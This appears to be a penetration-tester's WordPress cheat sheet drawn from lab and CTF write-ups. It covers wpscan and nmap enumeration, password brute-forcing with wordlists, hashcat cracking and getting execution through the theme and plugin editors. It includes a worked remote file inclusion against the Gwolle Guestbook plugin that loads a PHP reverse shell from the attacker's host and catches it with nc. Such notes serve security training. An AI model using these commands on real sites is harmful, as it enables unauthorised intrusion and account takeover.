## Wordpress WPScan

## Wordpress Scans
```
wpscan -u http://10.10.10.88/webservices/wp/ --enumerate p,t,u | tee wpscan.log <-- use --enumerate p,t,u option to enumerate plugins, themes, and users.
wpscan --url $URL --disable-tls-checks -U users.txt -P /usr/share/wordlists/rockyou.txt
wpscan --url https://brainfuck.htb --disable-tls-checks --api-token $WPSCAN_API
wpscan --url $URL --disable-tls-checks -U users.txt -P /usr/share/wordlists/rockyou.txt
wpscan -u http://192.168.0.14/ –wordlist /root/Dropbox/Vulnhub/MrRobot/fsocity.dic –username elliot  <-- Bruteforce elliot
wpscan -u http://10.11.1.234/ --threads 20 --wordlist /usr/share/wordlists/rockyou.txt --username admin  <----Bruteforce admin
wpscan --url https://192.168.26.141:12380/blogblog  <--this will give you basic information about wordpress
wpscan --url https://192.168.26.141:12380/blogblog --enumerate vp    <---this will give you information on vulnerable plugins
wpscan --url https://192.168.26.141:12380/blogblog --enumerate at    <---enumerate all things

Scan Wordpress
wpscan domain.com

Enumerate Wordpress users
wpscan --url http://10.10.10.2 --enumerate u
```

## Bruteforce Wordpress user's password
```
wpscan --url 10.10.10.2/secret --wordlist /usr/share/wordlists/dirb/big.txt --threads 2
```

## Make a quick cewl wordlist for bruteforcing
```
cewl http://192.168.233.61:8081/ | grep -v CeWL > custom-wordlist.txt
cewl --lowercase http://192.168.233.61:8081/ | grep -v CeWL  >> custom-wordlist.txt
root@kali# cewl -w cewl.txt -e -a http://forum.bart.htb
wpscan --url $URL --disable-tls-checks -U users -P ./cewl.txt
```

## RFI in Plugin
```
I’ll use --enumerate p,t,u option to enumerate plugins, themes, and users. The output is quite long, but snipped to show that it identifies three plugins
Always read the readme for each plugin.
root@kali# wpscan -u http://10.10.10.88/webservices/wp/ --enumerate p,t,u | tee wpscan.log
While none of those appear vulnerable to anything, looking at the readmes for each reveals something interesting… from http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt:
== Changelog ==
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D

RFI in gwolle-gb
There’s a RFI vulnerability in Gwolle Guestbook v 1.5.3.
In this case, visiting http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path will include that file.

POC
To test this, I first started a python http server on my host, and then visited the site:
root@kali# curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.88 - - [28/May/2018 15:10:22] "GET /wp-load.php HTTP/1.0" 404 -

Shell
I’ll grab php-reverse-shell.php from /usr/share/webshells/php on Kali.
Then I’ll name it wp-load.php, and open a nc listener, and run that curl again:

root@kali# curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/
10.10.10.88 - - [28/May/2018 15:15:03] "GET /wp-load.php HTTP/1.0" 200 -

root@kali# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.15.99] from (UNKNOWN) [10.10.10.88] 43868
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 i686 i686 GNU/Linux
 15:15:43 up  2:35,  0 users,  load average: 0.15, 0.04, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Themes shell
```
Typically with admin access to WordPress, there are a few ways to get execution. One is by going to Appearance > Editor and trying to edit a theme:
The reason I look at themes is that they contain PHP, unlike a POST which is just text/formatting. In this case, the editor is reporting that the files are not editable. It is very common in CTFs, and becoming more common in the real world, to make the theme PHP files not editable by the user that runs the webserver, as otherwise that is basically execution.
```

## Plugin Upload
```
Following the menu through “Plugins” > “Add Plugin” takes me to this form:
It’s complaining a bit about errors, but that could be the lack of internet on the HTB labs. The “Upload Plugin” button leads to another form with similar errors:
I showed in Spectra how to generate a plugin that was a simple webshell. I’ll grab the same ZIP file I used in Spectra and upload it, but there’s an error:
```

## Plugin Edit
```
I can also try the “Editor” link under the “Plugins” menu. For example, it can load akismet.php:
Unfortunately, it has the same text at the bottom. It seems the admin has made the entire WordPress directory structure not writable by the web user.
```

## NSE Wordpress Scripts
```
nmap -sV --script http-wordpress-enum 10.11.1.234   if ping probes are blocked, use -Pn rather that -sV
nmap -Pn --script http-wordpress-enum --script-args check-latest=true,search-limit=10 10.11.1.234 
nmap -sV 10.11.1.234 --script http-wordpress-enum --script-args limit=25
```

## Crack retrieved password hashes
```
hashcat -m 400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
400 	phpass, WordPress (MD5),Joomla (MD5) 	$P$984478476IagS59wHZvyQMArzfx58u. 

```


